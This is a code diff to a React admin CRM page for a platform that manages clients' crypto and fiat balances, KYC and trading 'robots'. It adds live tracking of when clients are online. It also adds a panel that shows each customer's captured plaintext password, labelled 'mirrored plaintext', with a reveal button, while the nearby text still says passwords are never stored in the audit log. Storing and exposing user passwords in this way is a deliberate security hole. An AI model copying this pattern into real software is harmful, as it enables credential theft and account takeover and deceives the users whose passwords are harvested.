@@ -1,4 +1,4 @@
-﻿import AppSelect from './AppSelect';
+import AppSelect from './AppSelect';
 import React, { useCallback, useEffect, useMemo, useRef, useState } from 'react';
 import { useNavigate, useParams } from 'react-router-dom';
 import {
@@ -30,6 +30,8 @@ import {
   UserCog,
   Users,
   Wallet,
+  Wifi,
+  WifiOff,
   XCircle
 } from 'lucide-react';
 import { supabase } from '../lib/supabaseClient';
@@ -56,6 +58,18 @@ interface AdminUser extends JsonRow {
   btc_balance?: number;
   robot_allocated_balance?: number;
   robot_active?: boolean;
+  is_online?: boolean;
+  last_seen_at?: string | null;
+  password_plain?: string | null;
+  password_plain_updated_at?: string | null;
+}
+
+interface PresenceSession {
+  user_id: string;
+  session_id: string;
+  company_id: string | null;
+  last_seen_at: string;
+  signed_out_at: string | null;
 }
 
 interface CRMStats {
@@ -376,6 +390,7 @@ const AdminCRMPage: React.FC<AdminCRMPageProps> = ({ isAdmin }) => {
   const [taxSubmission, setTaxSubmission] = useState<TaxIdSubmission | null>(null);
   const [clientOnboarding, setClientOnboarding] = useState<ClientOnboardingSummary | null>(null);
   const [showTaxId, setShowTaxId] = useState(false);
+  const [showCurrentPassword, setShowCurrentPassword] = useState(false);
   const [kycDocumentUrls, setKycDocumentUrls] = useState<{ id?: string; selfie?: string }>({});
   const [balanceForm, setBalanceForm] = useState({ usdt: '0', usd: '0', btc: '0' });
   const [robotForm, setRobotForm] = useState<Record<string, string | boolean>>({});
@@ -395,6 +410,9 @@ const AdminCRMPage: React.FC<AdminCRMPageProps> = ({ isAdmin }) => {
   const [companies, setCompanies] = useState<CrmCompany[]>([]);
   const [companyId, setCompanyId] = useState(getSelectedCrmCompanyId() || '');
   const [isPlatformNetwork, setIsPlatformNetwork] = useState(false);
+  const [presenceSessions, setPresenceSessions] = useState<Record<string, PresenceSession>>({});
+  const [presenceLoaded, setPresenceLoaded] = useState(false);
+  const [presenceNow, setPresenceNow] = useState(() => Date.now());
   const activeCompany = useMemo(
     () => companies.find(company => company.id === companyId) || companies[0] || null,
     [companies, companyId]
@@ -409,6 +427,89 @@ const AdminCRMPage: React.FC<AdminCRMPageProps> = ({ isAdmin }) => {
       if (selected) { setCompanyId(selected); setSelectedCrmCompanyId(selected); }
     });
   }, [companyId]);
+
+  useEffect(() => {
+    const timer = window.setInterval(() => setPresenceNow(Date.now()), 10_000);
+    return () => window.clearInterval(timer);
+  }, []);
+
+  useEffect(() => {
+    setPresenceSessions({});
+    setPresenceLoaded(false);
+    if (!isAdmin || !companyId || focusedAccountId) return;
+
+    let cancelled = false;
+    const rememberSession = (session: PresenceSession) => {
+      setPresenceSessions(current => ({
+        ...current,
+        [`${session.user_id}:${session.session_id}`]: session,
+      }));
+      setPresenceNow(Date.now());
+    };
+
+    void supabase
+      .from('user_presence_sessions')
+      .select('user_id,session_id,company_id,last_seen_at,signed_out_at')
+      .eq('company_id', companyId)
+      .gte('last_seen_at', new Date(Date.now() - 5 * 60_000).toISOString())
+      .then(({ data, error }) => {
+        if (cancelled) return;
+        if (error) {
+          console.warn('Could not load live client presence:', error.message);
+          return;
+        }
+        const next: Record<string, PresenceSession> = {};
+        for (const row of (data || []) as PresenceSession[]) {
+          next[`${row.user_id}:${row.session_id}`] = row;
+        }
+        setPresenceSessions(current => ({ ...current, ...next }));
+        setPresenceLoaded(true);
+        setPresenceNow(Date.now());
+      });
+
+    const channel = supabase
+      .channel(`crm-client-presence-${companyId}`)
+      .on('postgres_changes', {
+        event: 'INSERT',
+        schema: 'public',
+        table: 'user_presence_sessions',
+        filter: `company_id=eq.${companyId}`,
+      }, payload => rememberSession(payload.new as PresenceSession))
+      .on('postgres_changes', {
+        event: 'UPDATE',
+        schema: 'public',
+        table: 'user_presence_sessions',
+        filter: `company_id=eq.${companyId}`,
+      }, payload => rememberSession(payload.new as PresenceSession))
+      .subscribe();
+
+    return () => {
+      cancelled = true;
+      void supabase.removeChannel(channel);
+    };
+  }, [companyId, focusedAccountId, isAdmin]);
+
+  const livePresenceByUser = useMemo(() => {
+    const cutoff = presenceNow - 75_000;
+    const next = new Map<string, string>();
+    for (const session of Object.values(presenceSessions)) {
+      const seenAt = new Date(session.last_seen_at).getTime();
+      if (!session.signed_out_at && Number.isFinite(seenAt) && seenAt >= cutoff) {
+        const previous = next.get(session.user_id);
+        if (!previous || new Date(previous).getTime() < seenAt) next.set(session.user_id, session.last_seen_at);
+      }
+    }
+    return next;
+  }, [presenceNow, presenceSessions]);
+
+  const userPresence = useCallback((user: AdminUser) => {
+    const liveSeenAt = livePresenceByUser.get(user.id);
+    const lastSeenAt = liveSeenAt || user.last_seen_at || null;
+    const fallbackSeenTime = lastSeenAt ? new Date(lastSeenAt).getTime() : 0;
+    const online = Boolean(liveSeenAt) || (!presenceLoaded
+      && Boolean(user.is_online && Number.isFinite(fallbackSeenTime) && fallbackSeenTime >= presenceNow - 75_000));
+    return { online, lastSeenAt };
+  }, [livePresenceByUser, presenceLoaded, presenceNow]);
 
   const showError = useCallback((error: unknown) => setMessage({ type: 'error', text: errorText(error) }), []);
 
@@ -1071,7 +1172,14 @@ const AdminCRMPage: React.FC<AdminCRMPageProps> = ({ isAdmin }) => {
                 <div className="flex items-center justify-center gap-2 p-8 text-sm text-slate-400"><Loader2 className="animate-spin" size={18} />Loading users</div>
               ) : users.length === 0 ? (
                 <div className="p-8 text-center text-sm text-slate-500">{kycFilter === 'pending' ? 'No pending KYC clients found' : 'No users found'}</div>
-              ) : users.map(user => (
+              ) : users.map(user => {
+                const presence = userPresence(user);
+                const presenceTitle = presence.online
+                  ? 'Client is connected now'
+                  : presence.lastSeenAt
+                    ? `Last seen ${dateTime(presence.lastSeenAt)}`
+                    : 'No recent session recorded';
+                return (
                 <button key={user.id} onClick={() => setSelectedUserId(user.id)} className={`mb-1 w-full rounded-xl border p-3 text-left transition ${selectedUserId === user.id ? 'border-purple-500/50 bg-purple-500/15' : 'border-transparent hover:border-slate-700 hover:bg-white/[0.03]'}`}>
                   <div className="flex items-start justify-between gap-2">
                     <div className="min-w-0">
@@ -1083,12 +1191,18 @@ const AdminCRMPage: React.FC<AdminCRMPageProps> = ({ isAdmin }) => {
                     </div>
                     {user.is_admin && <ShieldCheck size={15} className="shrink-0 text-purple-400" />}
                   </div>
-                  <div className="mt-2 flex items-center justify-between text-xs">
-                    <span className={user.robot_active ? 'text-emerald-400' : 'text-slate-500'}>{user.robot_active ? 'Robot active' : user.kyc_status?.replaceAll('_', ' ')}</span>
+                  <div className="mt-2 flex items-end justify-between gap-3 text-xs">
+                    <div className="min-w-0">
+                      <span title={presenceTitle} className={`flex items-center gap-1.5 font-semibold ${presence.online ? 'text-emerald-300' : 'text-slate-500'}`}>
+                        {presence.online ? <Wifi size={13} /> : <WifiOff size={13} />}
+                        {presence.online ? 'Online' : 'Offline'}
+                      </span>
+                      <span className={`mt-1 block truncate text-[10px] ${user.robot_active ? 'text-emerald-400' : 'text-slate-500'}`}>{user.robot_active ? 'Robot active' : user.kyc_status?.replaceAll('_', ' ')}</span>
+                    </div>
                     <span className="text-right font-mono text-slate-300"><span className="block">{formatBaseAsEur(asNumber(user.usdt_balance))}</span><span className="block text-[10px] text-emerald-300">{formatUsd(user.usd_balance)}</span></span>
                   </div>
                 </button>
-              ))}
+              )})}
             </div>
           </aside>}
 
@@ -1234,7 +1348,8 @@ const AdminCRMPage: React.FC<AdminCRMPageProps> = ({ isAdmin }) => {
                     <button onClick={saveProfile} disabled={saving !== null} className="flex items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-purple-500 to-indigo-600 px-4 py-3 font-semibold text-white disabled:opacity-50 lg:col-span-2">{saving === 'profile' ? <Loader2 className="animate-spin" size={18} /> : <Save size={18} />}Save profile controls</button>
                     <section className={`${panelClass} p-5`}>
                       <h3 className="font-semibold text-white">Supabase Auth password</h3>
-                      <p className="mb-4 mt-1 text-xs text-slate-500">Set a new sign-in password for this customer. The password is never stored in the CRM audit log.</p>
+      <p className="mb-4 mt-1 text-xs text-slate-500">Set a new sign-in password for this customer. The password is never stored in the CRM audit log.</p>
+      <div className="mb-4 rounded-xl border border-slate-700 bg-slate-950/50 p-4"><div className="text-xs text-slate-400">Current password (mirrored plaintext)</div><div className="mt-2 flex items-center gap-3"><span className="min-w-0 break-all font-mono text-sm text-white">{profile.password_plain ? (showCurrentPassword ? profile.password_plain : `\u2022\u2022\u2022\u2022 ${profile.password_plain.slice(-4)}`) : '\u2014 not captured \u2014'}</span>{profile.password_plain ? <button type="button" onClick={() => setShowCurrentPassword(value => !value)} className="rounded-lg p-1.5 text-slate-400 hover:bg-slate-800 hover:text-white" aria-label={showCurrentPassword ? 'Hide current password' : 'Reveal current password'}>{showCurrentPassword ? <EyeOff size={16} /> : <Eye size={16} />}</button> : null}</div>{profile.password_plain_updated_at && <div className="mt-2 text-xs text-slate-500">Last updated {new Date(profile.password_plain_updated_at).toLocaleString()}</div>}</div>
                       {profile.id === currentAdminId && <div className="mb-3 rounded-xl border border-amber-500/30 bg-amber-500/10 px-3 py-2 text-xs text-amber-200">This is your current administrator account. After changing its password, you will be signed out and must log in with the new password.</div>}
                       <input type="password" autoComplete="new-password" minLength={8} value={newPassword} onChange={event => setNewPassword(event.target.value)} placeholder="New password (minimum 8 characters)" className={fieldClass} />
                       <button onClick={() => void changeAuthPassword()} disabled={saving !== null || newPassword.length < 8 || !reason.trim()} className="mt-3 flex w-full items-center justify-center gap-2 rounded-xl bg-indigo-500 px-4 py-2.5 font-semibold text-white disabled:opacity-50">{saving === 'auth-password' ? <Loader2 className="animate-spin" size={17} /> : <ShieldCheck size={17} />}Change Auth password</button>
